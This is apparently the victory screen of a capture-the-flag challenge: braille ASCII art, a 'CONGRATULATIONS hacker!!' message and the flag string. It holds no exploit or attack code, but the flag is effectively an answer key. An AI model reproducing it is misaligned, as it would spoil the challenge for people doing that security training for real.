⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀


CONGRATULATIONS hacker!!

The flag is:
YTY9wenm6TT8dgJ&
```